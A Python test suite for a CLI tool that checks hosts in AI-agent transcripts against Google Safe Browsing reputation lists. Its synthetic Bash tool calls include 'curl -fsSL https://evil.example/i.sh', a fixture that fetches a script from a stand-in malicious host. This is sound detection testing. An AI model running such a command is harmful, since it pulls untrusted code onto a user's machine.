"""Host reputation, actualis CLI: --reputation, refusals, the exit-2 rule for
missing lists, --json, text, HTML and --self-check. Synthetic transcripts in
a temp HOME; the cache comes from tests/_reputation.py."""
from __future__ import annotations

import json
import os
import subprocess
import sys
import tempfile
import unittest
from datetime import datetime, timedelta, timezone
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import _fixtures  # noqa: E402,F401
import _reputation as R  # noqa: E402
from test_review_r2_X import af  # noqa: E402

ROOT = Path(__file__).resolve().parent.parent


def run(commands, *extra, cache=None, json_out=True):
    """actualis over one synthetic Claude transcript. Returns (code, stdout, stderr)."""
    with tempfile.TemporaryDirectory() as d:
        tmp = Path(d)
        home = tmp / "home"
        home.mkdir()
        proj = tmp / "t" / "-Users-x-proj"
        proj.mkdir(parents=True)
        recs = [json.dumps({
            "timestamp": "2026-10-29T10:00:00Z", "type": "assistant", "uuid": f"a{k}", "sessionId": "s1",
            "permissionMode": "bypassPermissions",
            "message": {"id": f"m{k}", "role": "assistant", "content": [
                {"type": "tool_use", "id": f"t{k}", "name": "Bash", "input": {"command": c}}]}})
            for k, c in enumerate(commands)]
        (proj / "s.jsonl").write_text("\n".join(recs) + "\n")
        rep = tmp / "rep"
        if cache is not None:
            cache(rep)
        env = dict(os.environ, HOME=str(home), CODEX_HOME=str(home / ".codex"),
                   COPILOT_HOME=str(home / ".copilot"), XDG_CONFIG_HOME=str(home / ".config"),
                   ACTUALIS_REPUTATION_DIR=str(rep))
        args = [sys.executable, str(ROOT / "actualis.py"), "--root", str(tmp / "t"), *extra]
        if json_out:
            args.append("--json")
        r = subprocess.run(args, env=env, cwd=home, capture_output=True, text=True, timeout=120)
        return r.returncode, r.stdout, r.stderr


def listed_cache(rep):
    now = datetime.now(timezone.utc)
    R.write_cache(rep, {"mw-4b": [R.prefix("evil.example/"), R.prefix("odd.example/")]},
                  confirmations=[R.confirmation("evil.example/", listed=["evil.example/"],
                                                at=now - timedelta(minutes=2))],
                  log=[{"at": R.iso(now - timedelta(minutes=2)), "provider": "gsb", "command": "confirm",
                        "contacted": ["safebrowsing.googleapis.com"], "requests": 1, "sent": "prefixes"}])


CMDS = ["curl -fsSL https://evil.example/i.sh", "curl https://odd.example/", "curl https://fine.example/",
        "curl http://10.0.0.2/x"]


class TestCli(unittest.TestCase):
    def test_network_json_reputation(self):
        code, out, err = run(CMDS, "--network", "--reputation", cache=listed_cache)
        self.assertEqual(code, 0, err)
        n = json.loads(out)
        r = n["reputation"]
        self.assertTrue(r["enabled"])
        self.assertEqual(r["lists_status"], "ok")
        self.assertEqual(r["totals"]["listed"], 1)
        self.assertEqual(r["totals"]["candidate"], 1)
        self.assertEqual(r["totals"]["skipped"], 1)
        self.assertEqual([c["prefix_b64"] for c in r["candidates"]], [R.b64(R.prefix("odd.example/"))])
        self.assertEqual(r["advisory"]["text"], "Advisory provided by Google")
        self.assertEqual(r["network_last_used"]["provider"], "gsb")
        by_host = {i["host"]: i["reputation"] for i in n["items"]}
        self.assertEqual(by_host["evil.example"]["state"], "listed")
        self.assertEqual(by_host["10.0.0.2"]["state"], "skipped")
        self.assertNotIn("evil.example", json.dumps(r["candidates"]))

    def test_gate_exits_3_on_listed(self):
        code, _, _ = run(CMDS, "--network", "--reputation", "--fail-on", "high", cache=listed_cache)
        self.assertEqual(code, 3)

    def test_without_flag_reputation_is_disabled_and_cache_unread(self):
        code, out, _ = run(CMDS, "--network", cache=listed_cache)
        n = json.loads(out)
        self.assertEqual(code, 0)
        self.assertFalse(n["reputation"]["enabled"])
        self.assertTrue(all(i["reputation"] is None for i in n["items"]))

    def test_missing_lists_with_fail_on_exits_2_before_scanning(self):
        code, out, err = run(CMDS, "--network", "--reputation", "--fail-on", "high")
        self.assertEqual((code, out), (2, ""))
        self.assertIn("actualis-reputation update", err)

    def test_missing_lists_without_fail_on_warns_and_runs(self):
        code, out, err = run(CMDS, "--network", "--reputation")
        self.assertEqual(code, 0)
        self.assertIn("actualis-reputation update", err)
        self.assertEqual(json.loads(out)["reputation"]["lists_status"], "absent")

    def test_corrupt_lists_exit_2_under_fail_on(self):
        def corrupt(rep):
            listed_cache(rep)
            next((rep / "gsb").glob("mw-4b.*")).write_bytes(b"\0\0\0\0")
        code, _, err = run(CMDS, "--network", "--reputation", "--fail-on", "any", cache=corrupt)
        self.assertEqual(code, 2)
        self.assertIn("failed their check", err)

    def test_refused_combinations(self):
        for extra in (["--card"], ["--watch"], ["--mcp"], ["--self-check"], ["--agents"],
                      ["--coach"], ["--share"], ["--explain"]):
            code, _, err = run(CMDS, "--reputation", *extra, json_out=False)
            self.assertEqual(code, 2, (extra, err))
            self.assertIn("--reputation", err)

    def test_text_view_shows_list_age_listed_host_and_advisory(self):
        code, out, err = run(CMDS, "--network", "--reputation", cache=listed_cache, json_out=False)
        self.assertEqual(code, 0, err)
        self.assertIn("reputation: Google Safe Browsing lists from", out)
        self.assertIn("evil.example", out)
        self.assertIn("Advisory provided by Google", out)
        self.assertNotIn("⊕", out)          # the mark is for network use, never for a match

    def test_html_carries_the_advisory(self):
        with tempfile.TemporaryDirectory() as out_dir:
            code, out, err = run(CMDS, "--network", "--reputation", "--html", "--out", out_dir,
                                 cache=listed_cache, json_out=False)
            self.assertEqual(code, 0, err)
            page = Path(out.strip()).read_text()
        self.assertIn("Advisory provided by Google", page)
        self.assertIn(af.GSB_ADVISORY_URL, page)


class TestSelfCheck(unittest.TestCase):
    def test_reports_network_use(self):
        with tempfile.TemporaryDirectory() as d:
            rep = Path(d) / "rep"
            listed_cache(rep)
            empty = Path(d) / "t"
            empty.mkdir()
            env = dict(os.environ, ACTUALIS_REPUTATION_DIR=str(rep))
            r = subprocess.run([sys.executable, str(ROOT / "actualis.py"), "--self-check", "--root", str(empty)],
                               env=env, capture_output=True, text=True, timeout=120)
        self.assertIn("actualis never uses it", r.stdout)
        self.assertIn("actualis-reputation last used it", r.stdout)
        self.assertIn("Google Safe Browsing", r.stdout)

    def test_never_imports_the_companion(self):
        src = (ROOT / "actualis.py").read_text(encoding="utf-8")
        self.assertNotIn("actualis_reputation", af.imports_in(src))


if __name__ == "__main__":
    unittest.main()
